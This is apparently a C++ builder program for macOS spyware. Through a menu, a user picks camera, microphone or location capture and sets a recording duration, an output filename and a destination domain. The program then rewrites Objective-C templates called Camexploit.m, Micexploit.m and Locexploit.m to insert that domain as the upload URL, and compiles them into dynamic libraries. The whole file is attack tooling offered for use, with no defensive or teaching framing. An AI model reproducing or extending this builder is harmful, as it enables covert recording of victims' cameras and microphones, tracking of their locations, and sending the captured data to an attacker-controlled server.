#include <iostream>
#include <string>
#include <cctype>
#include <fstream>
#include <sstream>
bool isNumber(const std::string& str) {
    for (char const &c : str) {
        if (!std::isdigit(c)) return false;
    }
    return true;
}

void compileAndExport(const std::string &libraryName) {
    std::string compileCommand;
    if (libraryName == "Camera") {
        compileCommand = "gcc -dynamiclib -framework Foundation -framework AVFoundation ./libs/Camexploit.m -o ./Exports/Cam.dylib";
    } else if (libraryName == "Microphone") {
        compileCommand = "gcc -dynamiclib -framework Foundation -framework AVFoundation ./libs/Micexploit.m -o ./Exports/Micexploit.dylib";
    } else if (libraryName == "Location") {
        compileCommand = "gcc -dynamiclib -framework Foundation -framework CoreLocation -framework AVFoundation ./libs/Locexploit.m -o ./Exports/Locexploit.dylib";
    }

    int result = system(compileCommand.c_str());
    if (result == 0) {
        std::cout << libraryName << " compilation successful. Exported to ./Exports folder.\n";
    } else {
        std::cerr << libraryName << " compilation failed. Please check the source code.\n";
    }
}

void updateFileContent(const std::string& filePath, const std::string& timeInSeconds, const std::string& outputFilename, const std::string& domainName) {
    std::ifstream file(filePath);
    std::ostringstream tempStream;
    std::string line;

    while (std::getline(file, line)) {
        if (line.find("[NSThread sleepForTimeInterval:") != std::string::npos) {
            tempStream << "[NSThread sleepForTimeInterval:" << timeInSeconds << ".0];\n";
        } else if (line.find("[NSTemporaryDirectory() stringByAppendingPathComponent:@\"file_name\"]") != std::string::npos) {
            tempStream << "NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@\"" << outputFilename << "\"];\n";
        } else if (line.find("[request setURL:[NSURL URLWithString:@\"http://a.com\"]]") != std::string::npos) {
            tempStream << "[request setURL:[NSURL URLWithString:@\"" << domainName << "\"]];\n";
        } else {
            tempStream << line << "\n";
        }
    }
    file.close();

    std::ofstream outFile(filePath);
    outFile << tempStream.str();
    outFile.close();
}
int main() {
    bool camera = false;
    bool microphone = false;
    bool location = false;
    std::string timeInSeconds;
    std::string outputFilename;
    std::string domainName;

    while (true) {
        std::cout << "Select options by entering the number:\n";
        std::cout << "1. Toggle Camera (" << (camera ? "Selected" : "Not Selected") << ")\n";
        std::cout << "2. Toggle Microphone (" << (microphone ? "Selected" : "Not Selected") << ")\n";
        std::cout << "3. Toggle Location (" << (location ? "Selected" : "Not Selected") << ")\n";
        std::cout << "4. Set Time In Second for Recording (" << timeInSeconds << ")\n";
        std::cout << "5. Set Output Filename (" << outputFilename << ")\n";
        std::cout << "6. Set Domain Name (" << domainName << ")\n";
        std::cout << "7. Export\n";
        std::cout << "8. Exit\n";
        std::cout << "> ";

        int choice;
        std::cin >> choice;
        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n'); // clear the buffer

        switch (choice) {
            case 1:
                camera = !camera;
                break;
            case 2:
                microphone = !microphone;
                break;
            case 3:
                location = !location;
                break;
            case 4:
                if (camera || microphone) {
                    std::cout << "Enter time in seconds: ";
                    std::getline(std::cin, timeInSeconds);
                    if (!isNumber(timeInSeconds)) {
                        std::cout << "Invalid input! Please enter a valid number for time.\n";
                        timeInSeconds = "";
                    }
                } else {
                    std::cout << "You need to select Camera or Microphone first!\n";
                }
                break;
            case 5:
                if (camera || microphone) {
                    std::cout << "Enter output filename: ";
                    std::getline(std::cin, outputFilename);
                } else {
                    std::cout << "You need to select Camera or Microphone first!\n";
                }
                break;
            case 6:
                std::cout << "Enter domain name (including http:// or https://): ";
                std::getline(std::cin, domainName);
                break;
            case 7:
                if (!camera && !microphone && !location) {
                    std::cout << "Please select at least one option!\n";
                } else if ((camera || microphone) && (timeInSeconds.empty() || outputFilename.empty() || domainName.empty())) {
                    std::cout << "Please fill in all required fields!\n";
                } else if ( location && domainName.empty()) {
                    std::cout << "Please fill in all required fields!\n";
                } else {
                    if (camera) {
                        updateFileContent("./libs/Camexploit.m", timeInSeconds, outputFilename, domainName);
                        compileAndExport("Camera");
                    }
                    if (microphone) {
                        updateFileContent("./libs/Micexploit.m", timeInSeconds, outputFilename, domainName);
                        compileAndExport("Microphone");
                    }
                    if (location) {
                        updateFileContent("./libs/Locexploit.m", timeInSeconds, outputFilename, domainName);
                        compileAndExport("Location");
                    }
                }
                break;
            case 8:
                return 0;
            default:
                std::cout << "Invalid choice. Please try again.\n";
                break;
        }
    }

    return 0;
}
